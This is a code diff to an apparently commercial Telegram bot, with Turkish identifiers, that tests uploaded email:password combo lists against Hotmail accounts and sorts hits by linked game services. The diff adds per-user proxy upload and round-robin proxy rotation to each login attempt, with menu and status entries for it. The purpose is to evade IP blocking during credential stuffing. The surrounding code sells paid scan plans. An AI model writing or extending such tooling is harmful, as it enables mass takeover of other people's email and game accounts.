@@ -17,11 +17,19 @@ ADMIN_THREAD = 10
 
 KEY_FILE = "keys.json"
 USER_FILE = "users.json"
-BACKUP_FILE = "backup.json"
+PROXY_FILE = "proxies.txt"
 
 HITS_FILE = "hotmailbothits.txt"
 TWOFA_FILE = "checkerbot2FA.txt"
 ZIP_FILE = "hotmailgamechecker.zip"
+
+proxy_list = []
+proxy_index = 0
+proxy_lock = threading.Lock()
+
+user_proxies = {}
+proxy_waiting = {}
+user_proxy_index = {}
 
 GAME_EMAILS = {
     "supercell": {"email": "noreply@id.supercell.com", "file": "supercellbothits.txt", "label": "🎮 SUPERCELL"},
@@ -52,6 +60,44 @@ bekleyen_hesaplar = {}
 
 keys_db = {}
 users_db = {}
+
+def load_user_proxies(chat_id, content):
+    global user_proxies, user_proxy_index
+    user_id = str(chat_id)
+    user_proxies[user_id] = []
+    user_proxy_index[user_id] = 0
+    
+    lines = content.strip().split('\n')
+    for line in lines:
+        line = line.strip()
+        if line and not line.startswith('#'):
+            user_proxies[user_id].append(line)
+    
+    return len(user_proxies[user_id])
+
+def get_user_proxy(chat_id):
+    global user_proxies, user_proxy_index
+    user_id = str(chat_id)
+    
+    if user_id in user_proxies and user_proxies[user_id]:
+        proxies = user_proxies[user_id]
+        idx = user_proxy_index.get(user_id, 0)
+        proxy = proxies[idx % len(proxies)]
+        user_proxy_index[user_id] = idx + 1
+        return proxy
+    
+    return None
+
+def format_proxy(p):
+    if not p:
+        return None
+    p = p.strip()
+    if "://" in p:
+        return p
+    parts = p.split(":")
+    if len(parts) == 4:
+        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    return f"http://{p}"
 
 def load_db():
     global keys_db, users_db
@@ -549,7 +595,8 @@ def ana_menu(chat_id):
              {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
             [{"text": "📊 Status", "callback_data": "durum"},
              {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
-            [{"text": "💰 Prices", "callback_data": "fiyatlar"}],
+            [{"text": "💰 Prices", "callback_data": "fiyatlar"},
+             {"text": "📡 Proxy", "callback_data": "proxy"}],
         ]
     }
     
@@ -630,13 +677,16 @@ def durum_menu(chat_id):
         else:
             kalan_hak = "Unlimited"
         
+        proxy_count = len(user_proxies.get(str(chat_id), []))
+        
         text = (
             f"📊 STATUS PANEL\n\n"
             f"📋 Plan: {plan}\n"
             f"⏳ Remaining: {kalan}\n"
             f"📊 Today: {daily_used}/{daily_limit if daily_limit > 0 else '∞'} scanned\n"
             f"📂 Single Scan: {single_limit if single_limit > 0 else '∞'}\n"
-            f"⚡ Thread: {plan_info['thread']}\n\n"
+            f"⚡ Thread: {plan_info['thread']}\n"
+            f"📡 Proxies: {proxy_count}\n\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"Remaining today: {kalan_hak} accounts"
         )
@@ -741,7 +791,8 @@ def duyuru(chat_id, mesaj):
             send_message(int(user_id), f"📢 ANNOUNCEMENT\n\n{mesaj}")
             gonderilen += 1
         except:
-            pass    
+            pass
+    
     send_message(chat_id, f"✅ Announcement sent to {gonderilen} users.")
 
 def bakim(chat_id):
@@ -790,7 +841,11 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 return
             email, password = combo.split(":", 1)
             tag = email.split("@")[0][:12]
-            c = marazali(email, password, None)
+            
+            proxy_str = get_user_proxy(chat_id)
+            formatted_proxy = format_proxy(proxy_str) if proxy_str else None
+            
+            c = marazali(email, password, formatted_proxy)
             status, mesaj_info = c.check(tag)
             with lock:
                 if status == "SUCCESS":
@@ -923,6 +978,9 @@ def telegram_bot():
                             durum_menu(chat_id)
                         elif data_cb == "fiyatlar":
                             fiyat_menu(chat_id)
+                        elif data_cb == "proxy":
+                            proxy_waiting[chat_id] = True
+                            send_message(chat_id, "📡 Send your proxy file.\n\nFormat: proxies.txt\nEach line: ip:port or ip:port:user:pass")
                         elif data_cb == "baslat":
                             send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                         elif data_cb == "multi_start":
@@ -959,11 +1017,24 @@ def telegram_bot():
                     msg = update["message"]
                     chat_id = msg["chat"]["id"]
                     if "document" in msg:
+                        file_id = msg["document"]["file_id"]
+                        file_name = msg["document"].get("file_name", "combo.txt")
+                        
+                        # Proxy dosyası bekleniyorsa
+                        if chat_id in proxy_waiting:
+                            content = download_file(file_id)
+                            if content:
+                                count = load_user_proxies(chat_id, content)
+                                send_message(chat_id, f"✅ {count} proxies loaded!\nThese will be used for your scans.")
+                            else:
+                                send_message(chat_id, "❌ File could not be downloaded.")
+                            del proxy_waiting[chat_id]
+                            continue
+                        
                         if bakim_modu and str(chat_id) != str(ADMIN_ID):
                             send_message(chat_id, "🔧 Bot is in maintenance mode. Please try later.")
                             continue
-                        file_id = msg["document"]["file_id"]
-                        file_name = msg["document"].get("file_name", "combo.txt")
+                        
                         if chat_id in multi_bekleyen:
                             multi_bekleyen[chat_id].append((file_id, file_name))
                             send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])} files. Type /bitti when done.")
@@ -1015,6 +1086,10 @@ def telegram_bot():
                             t.start()
                     elif msg.get("text") == "/start":
                         ana_menu(chat_id)
+                    elif msg.get("text") == "/proxy":
+                        user_id = str(chat_id)
+                        count = len(user_proxies.get(user_id, []))
+                        send_message(chat_id, f"📡 Proxies: {count} loaded")
                     elif msg.get("text") == "/stop":
                         tarama_durdur[chat_id] = True
                         send_message(chat_id, "⏹️ Stopping scan... Results will be sent shortly.")
